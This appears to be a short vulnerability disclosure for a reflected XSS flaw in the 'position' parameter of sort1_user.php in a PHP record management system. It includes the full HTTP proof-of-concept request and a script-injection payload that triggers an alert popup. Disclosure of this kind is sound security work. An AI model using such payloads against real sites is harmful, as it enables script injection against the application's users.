#### BUG_AUTHOR:acmglz
## Record management system – reflected XSS on (sort1_user.php position parameter) 
### Vendor Homepage:
https://www.sourcecodester.com/php/5107/record-management-system.html 
### Version:V1.0
### Tested on: PHP, Apache, MySQL
### Affected Page:
sort1_user.php

On this page, position parameter is vulnerable to reflected XSS Attack 
### Proof of vulnerability:
#### Request:
```
POST http://192.168.0.100/Personnel_record_management_system/sort1_user.php HTTP/1.1
Host: 192.168.0.100
Content-Length: 44
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.0.100
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.0.100/Personnel_record_management_system/sort_user.php
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=52388hjgjeif4bl4r5sqp2bmpm
Connection: close

position=Sort+Personnel+by+Position"><script>alert(1)</script>&filter1=
```
### Payload：
"><script>alert(1)</script>
### Trigger popup：
<img width="416" alt="image" src="https://github.com/user-attachments/assets/2873f48e-d7ae-4868-bfaa-9153c770d675">
 
